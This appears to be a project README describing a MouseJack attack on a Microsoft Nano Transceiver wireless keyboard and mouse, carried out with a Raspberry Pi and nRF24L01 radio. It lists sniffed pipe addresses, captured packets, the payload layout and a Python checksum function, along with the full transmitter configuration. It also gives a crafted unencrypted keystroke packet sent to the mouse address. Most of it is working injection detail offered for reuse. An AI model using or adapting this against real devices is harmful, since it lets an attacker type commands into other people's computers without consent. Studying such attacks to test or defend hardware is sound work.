# mousejack_for_microsoft
Mousejack. Example of the attack for a microsoft keyboard. 
Tested for ID **045e:0745** Microsoft Corp. Nano Transceiver v1.0 for Bluetooth

Chip is nRF24L01 compatible.<br>
Code is simple, on Python.<br>
For raspberry with nRF24L01.<br>

I catch transmitting on channel 70 (not only this one)<br>
There are two address pairs. `[0xa97cd6796d, 0x5f359e5b53, 0xa97cd679cd, 0x5f359e7350]`<br>
One pair for a mouse:         `0xa97cd679cd, 0x5f359e7350`<br>
Another pair for a keyboard:  `0xa97cd6796d, 0x5f359e5b53`<br>
On mouse address you can sniff mouse traffic.<br>
I got this:<br>
`4c044801781bcc200000787ffbff80000000003e` It was a move up-left with speeds `787f` and `fbff`.<br>
Sample packets:<br>
```
'a97cd6796d 4c04480178 484020000000007fff800000000062'.replace(' ',''),
'a97cd6796d 4c04480178 2007a00000000000007fff8000004d'.replace(' ',''),
'a97cd6796d 4c04480178 4e402000007f7f8080000000000064'.replace(' ',''),

'a97cd6796d 4d04480178 1e87a00000000000007fff80000073'.replace(' ',''),
'a97cd6796d 4d04480178 4ec020000000800080000000000064'.replace(' ',''),

'a97cd6796d 4e04480178 1f07a00000000000007fff80000072'.replace(' ',''),
```

Lats look at `'a97cd6796d 4e04480178 484020000000007fff800000000062'` <br>
`a97cd6796d` - address of the pipe <br>
`4c04480178` - some ID <br>
`484020000000007fff800000000062` - payload. First 2 bytes - some sequence.
The last one byte - checsum of the payload
```
def checksum(p, ck_offset = 0):
    csum = 0
    for i in range(len(p)):
        csum = csum ^ p[i]
    return csum ^ ck_offset
```
Checksum calculated from payload: `484020000000007fff8000000000` - it is `62`. This checksum is additional to
checksum of the nRF packet.<br>
To transmitting i use this configuration:<br>
```
================ SPI Configuration ================
CSN Pin  	 = CE0 (PI Hardware Driven)`
CE Pin  	 = Custom GPIO25
Clock Speed	 = 8 Mhz
================ NRF Configuration ================
STATUS		 = 0x0e RX_DR=0 TX_DS=0 MAX_RT=0 RX_P_NO=7 TX_FULL=0
RX_ADDR_P0-1	 = 0xa97cd6796d 0xc2c2c2c2c2
RX_ADDR_P2-5	 = 0xc3 0xc4 0xc5 0xc6
TX_ADDR		 = 0xa97cd6796d
RX_PW_P0-6	 = 0x14 0x00 0x00 0x00 0x00 0x00
EN_AA		 = 0x00
EN_RXADDR	 = 0x03
RF_CH		 = 0x46
RF_SETUP	 = 0x0f
CONFIG		 = 0x0e
DYNPD/FEATURE	 = 0x00 0x00
Data Rate	 = 2MBPS
Model		 = nRF24L01+
CRC Length	 = 16 bits
PA Power	 = PA_MAX
```

**Do not forget!** For attack we use **mouse** address as a target. And send a notcrypted keyboard packet to it.<br>
In sample i send this:
`a97cd6796d 4c04480178 1b0020000023000000000000000052`

`2300` - it's a [Keyboard PrintScreen](http://www.freebsddiary.org/APC/usb_hid_usages.php)<br>
It's a usb hid data. Why **23** and not **46**?
Couse:<br>
`0x2300` - `0010001100000000` if we skip first bit we got `0100011000000000` - `0x4600` (0x46	Keyboard PrintScreen)

**Try to send packets few times. Till sequence coincides.**
